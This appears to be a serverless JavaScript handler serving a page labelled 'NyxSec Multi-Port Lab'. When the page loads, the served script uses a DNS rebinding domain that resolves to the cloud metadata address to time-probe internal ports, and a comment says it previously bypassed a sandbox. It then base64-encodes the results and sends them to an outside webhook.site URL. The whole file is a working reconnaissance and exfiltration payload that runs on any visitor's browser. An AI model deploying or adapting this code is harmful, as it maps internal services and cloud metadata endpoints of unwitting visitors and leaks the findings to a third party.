export default function handler(req, res) {
  res.setHeader('Content-Type', 'text/html');
  res.status(200).send(`
    <html>
      <head><title>NyxSec Multi-Port Lab</title></head>
      <body>
        <pre>Status: Mapping Internal Services via DNS Rebinding...</pre>
        <script>
          const webhook = "https://webhook.site/0a66617e-3159-4804-9229-84d7010ec66d";
          // Menggunakan domain rebinding yang sebelumnya berhasil mem-bypass sandbox
          const rebindBase = "01010101.a9fea9fe.rbndr.us"; 

          async function probePort(port) {
            const start = Date.now();
            return new Promise((resolve) => {
              const img = new Image();
              
              // Timeout 7 detik (sedikit lebih lama untuk menangkap delay jaringan internal)
              const timer = setTimeout(() => {
                img.src = ""; 
                resolve({ port, time: Date.now() - start, status: "timeout" });
              }, 7000);

              img.onload = img.onerror = () => {
                clearTimeout(timer);
                resolve({ port, time: Date.now() - start, status: "finished" });
              };

              // Menyerang kombinasi Host + Port
              img.src = "http://" + rebindBase + ":" + port + "/favicon.ico?cache=" + Math.random();
            });
          }

          async function runTest() {
            const ports = [80, 443, 8080, 8443, 9000, 9090]; // Daftar port internal umum
            const results = [];
            
            for(const port of ports) {
              results.push(await probePort(port));
            }

            // Kirim laporan lengkap ke Webhook Aditya
            fetch(webhook + "?multi_port=" + btoa(JSON.stringify(results)));
          }

          runTest();
        </script>
      </body>
    </html>
  `);
}
